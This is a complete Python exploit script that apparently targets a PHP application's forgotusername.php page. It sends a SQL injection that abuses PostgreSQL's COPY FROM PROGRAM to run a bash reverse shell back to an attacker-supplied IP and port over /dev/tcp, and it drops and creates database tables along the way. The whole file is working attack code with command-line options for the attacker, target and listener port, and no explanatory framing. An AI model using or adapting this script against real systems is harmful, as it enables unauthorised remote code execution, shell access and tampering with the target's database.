import requests, argparse, urllib

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--ip', dest='ip', help='IP Attacker', required=True)
parser.add_argument('-p', '--port', dest='port', help='Listening Port for Reverse Shell', required=True)
parser.add_argument('-t','--target', dest='target', help='Target Machine', required=True)
args = parser.parse_args()

http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def send_rce(ip, port, target):
    print("[+] Sending RCE Payload ...\nPlease check your nc")
    payload = f"""'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo "bash -i >& /dev/tcp/{ip}/{port} 0>&1" | bash'; DROP TABLE IF EXISTS cmd_exec; --"""
    enc_payload = urllib.parse.quote(payload)
    url = f"http://{target}/forgotusername.php"
    data = f"username=admin{enc_payload}"
    header = {'Content-Type':'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=header)

def main():
    target = args.target
    ip = args.ip
    port = args.port
    
    print(f"[!] Make sure your nc already listening to port {port}")
    send_rce(ip,port,target)


if __name__ == "__main__":
    main()